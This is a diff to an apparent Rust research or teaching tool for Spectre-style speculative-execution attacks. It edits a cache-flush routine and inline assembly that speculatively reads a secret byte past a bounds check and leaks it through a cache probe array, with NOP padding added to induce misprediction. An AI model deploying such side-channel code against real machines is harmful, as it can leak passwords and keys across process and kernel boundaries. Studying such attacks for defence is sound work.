@@ -3,9 +3,6 @@ use crate::*;
 #[cfg(feature = "handle-sigsegv")]
 use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
 
-#[cfg(feature = "std")]
-extern crate std;
-
 #[cfg(feature = "handle-sigsegv")]
 pub(crate) extern "C" fn handle_sigsegv(
     _signal: libc::c_int,
@@ -33,11 +30,11 @@ pub(crate) extern "C" fn handle_sigsegv(
 
 #[inline(always)]
 #[cfg(feature = "tester")]
-pub(crate) fn flush_measurement_area() {
+pub(crate) fn flush_measurement_area(base_addr: usize) {
     unsafe {
         for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
             core::arch::x86_64::_mm_clflush(
-                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
+                (base_addr + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
             );
         }
     }
@@ -94,17 +91,27 @@ pub unsafe extern "C" fn access_memory_spectre(base_addr: usize, off: usize) {
     // Right!?
     asm!(
         // if off <= SPECTRE_LIMIT {
-        "mov rcx, [rcx]", "cmp rcx, {2}", "jb 2f",
+        "mov rcx, [rcx]", "cmp rcx, rsi", "jb 2f",
         // read_volatile(BASE_ADDR[MINIDOW_SECRET[off]*MULTIPLE_OFFSET])
             // rbx = MINIDOW_SECRET[off]
-            "movzx rbx, byte ptr [rax+{0}]",
+            "movzx rbx, byte ptr [rsi+{0}]",
             // rbx = MINIDOW_SECRET[off]*MULTIPLE_OFFSET
             "imul rbx, {multiple_offset}",
             // rax = *(BASE_ADDR+MINIDOW_SECRET[off]*MULTIPLE_OFFSET)
-            "movzx rax, byte ptr [{1}+rbx]",
+            "movzx rax, byte ptr [rdi+rbx]",
+            "jmp 2f",
+        // nops to help the CPu mispredict ;)
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
         // end of loop
         "2:",
-        in(reg) secret_base, in(reg) base_addr, in(reg) off, multiple_offset = const MULTIPLE_OFFSET, inout("rax") off => _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
+        in(reg) secret_base, multiple_offset = const MULTIPLE_OFFSET, in("rdi") base_addr, in("rsi") off, out("rax") _, inout("rcx") &SPECTRE_LIMIT => _, out("rbx") _);
 }
 
 #[inline(always)]
